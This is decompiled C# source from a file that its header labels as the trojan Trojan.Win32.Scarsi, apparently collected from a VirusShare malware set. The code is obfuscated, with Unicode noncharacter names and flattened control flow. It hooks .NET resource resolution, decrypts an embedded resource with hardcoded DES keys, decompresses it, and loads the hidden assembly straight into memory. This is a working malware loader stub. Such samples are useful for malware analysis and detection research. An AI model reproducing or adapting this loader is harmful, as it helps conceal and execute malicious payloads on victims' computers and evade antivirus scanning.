// Decompiled with JetBrains decompiler
// Type: ﷚
// Assembly: C, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D2E568C6-598F-4547-B67D-EBC6962F4D09
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scarsi.apqi-e713f3e719901b1b2cb042808efbf86e74560ee47a26c6d9176282a2eaf54c27.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

internal class \uFDDA
{
  private static Assembly \uFDD0;
  private static string[] \uFDD1;

  private static Assembly \uFDD0(object _param0, ResolveEventArgs _param1)
  {
    Stream manifestResourceStream;
    int num;
    if (\uFDDA.\uFDD1 == null)
    {
      manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(\uFDDC.\uFDD0("삡鶣슥춧麩钫쮭膯讱肳펵\uDEB7躹誻貽\uF0BF贈ꃃ\uF5C5ￇﻉ\uF5CBꯍ\uE4CF\uE0D1럓\uEFD5\uECD7뿙\uECDB뫝蓟", 7));
      num = 0;
    }
    else
      goto label_10;
label_2:
    Stream stream;
    MemoryStream memoryStream;
    byte[] buffer;
    while (true)
    {
      switch (num)
      {
        case 0:
          if (manifestResourceStream != null)
          {
            stream = (Stream) new DeflateStream((Stream) new CryptoStream(manifestResourceStream, new DESCryptoServiceProvider().CreateDecryptor(BitConverter.GetBytes(16954607111507422649UL), BitConverter.GetBytes(17156072796150509993UL)), CryptoStreamMode.Read), CompressionMode.Decompress);
            num = 1;
            continue;
          }
          goto label_10;
        case 1:
          memoryStream = new MemoryStream();
          num = 2;
          continue;
        case 2:
          buffer = new byte[4096];
          num = 3;
          continue;
        case 3:
          goto label_8;
        default:
          goto label_15;
      }
    }
label_8:
    int count;
    while ((count = stream.Read(buffer, 0, 4096)) != 0)
      memoryStream.Write(buffer, 0, count);
    \uFDDA.\uFDD1 = (\uFDDA.\uFDD0 = Assembly.Load(memoryStream.ToArray())).GetManifestResourceNames();
    goto label_10;
label_15:
    int index;
    for (; index < \uFDDA.\uFDD1.Length; ++index)
    {
      if (\uFDDA.\uFDD1[index] == _param1.Name)
        return \uFDDA.\uFDD0;
    }
    goto label_16;
label_10:
    if (\uFDDA.\uFDD1 != null)
    {
      index = 0;
      num = 4;
      goto label_2;
    }
label_16:
    return (Assembly) null;
  }

  internal static void \uFDD1() => AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\uFDDA.\uFDD0);
}
